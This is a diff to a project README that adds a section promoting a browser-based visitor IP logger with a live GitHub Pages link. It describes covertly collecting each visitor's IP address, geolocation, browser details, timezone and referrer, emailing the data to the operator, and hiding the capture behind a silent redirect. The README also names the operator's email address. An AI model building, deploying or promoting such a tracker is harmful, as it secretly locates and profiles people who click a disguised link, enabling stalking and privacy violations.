@@ -53,3 +53,19 @@ geo{country,city,isp,lat,lon}, headers{...}`
 MIT.
 
 <!-- live -->
+
+## Static always-on edition (recommended, free forever)
+
+`index.html` runs the whole logger **in the visitor's browser** — no
+server, no sleep, no keys. Live at:
+https://aoodiakdiro0001-ops.github.io/baraniplog/
+
+- Collects IP (ipify) → geo (ipapi.co → ipwho.is fallback), UA parse,
+  language, timezone, screen, referrer.
+- Delivers to your inbox via FormSubmit (+Telegram if you fill `CONFIG.tg`
+  privately — never commit secrets).
+- Silent redirect after ~2.5s. Test with `?debug=1` (shows data, no redirect).
+
+**One-time setup:** open the live link once yourself → FormSubmit sends an
+activation email to baranavisat@gmail.com → click it. Afterwards every
+visit lands in your inbox. First real visit = first email.
